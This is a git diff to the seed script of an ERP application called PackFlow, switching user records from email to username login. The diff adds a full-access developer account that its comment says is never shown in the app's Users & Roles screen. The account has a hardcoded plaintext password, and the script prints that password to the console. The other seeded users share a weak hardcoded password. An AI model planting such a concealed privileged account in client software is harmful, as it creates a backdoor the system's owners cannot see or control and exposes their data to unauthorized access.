@@ -8,45 +8,40 @@ async function main() {
   console.log('🌱 Seeding PackFlow ERP...');
 
   // ── Users ──────────────────────────────────────────────────────────────────
+  // Hidden Developer account — full access, never shown in Users & Roles.
+  // ⚠️ This plaintext seed password is for first-deploy only — ROTATE IT after.
+  await prisma.user.upsert({
+    where: { username: 'aryanbodkhe' },
+    update: {},
+    create: {
+      name: 'Aryan Bodkhe',
+      username: 'aryanbodkhe',
+      passwordHash: await bcrypt.hash('aryandeveloper', 10),
+      role: UserRole.DEVELOPER,
+    },
+  });
+
   const hashedPassword = await bcrypt.hash('packflow123', 10);
 
   const owner = await prisma.user.upsert({
-    where: { email: 'owner@packflow.in' },
+    where: { username: 'rajeshkumar' },
     update: {},
-    create: {
-      name: 'Rajesh Kumar',
-      email: 'owner@packflow.in',
-      password: hashedPassword,
-      role: UserRole.OWNER,
-      phone: '+919876543210',
-    },
+    create: { name: 'Rajesh Kumar', username: 'rajeshkumar', passwordHash: hashedPassword, role: UserRole.OWNER },
   });
 
   const manager = await prisma.user.upsert({
-    where: { email: 'manager@packflow.in' },
+    where: { username: 'priyasharma' },
     update: {},
-    create: {
-      name: 'Priya Sharma',
-      email: 'manager@packflow.in',
-      password: hashedPassword,
-      role: UserRole.MANAGER,
-      phone: '+919876543211',
-    },
+    create: { name: 'Priya Sharma', username: 'priyasharma', passwordHash: hashedPassword, role: UserRole.MANAGER },
   });
 
   const staff1 = await prisma.user.upsert({
-    where: { email: 'staff1@packflow.in' },
+    where: { username: 'amitsingh' },
     update: {},
-    create: {
-      name: 'Amit Singh',
-      email: 'staff1@packflow.in',
-      password: hashedPassword,
-      role: UserRole.STAFF,
-      phone: '+919876543212',
-    },
+    create: { name: 'Amit Singh', username: 'amitsingh', passwordHash: hashedPassword, role: UserRole.STAFF },
   });
 
-  console.log('✅ Users created');
+  console.log('✅ Users created (developer: aryanbodkhe / aryandeveloper)');
 
   // ── Vendors ────────────────────────────────────────────────────────────────
   const vendor1 = await prisma.vendor.upsert({
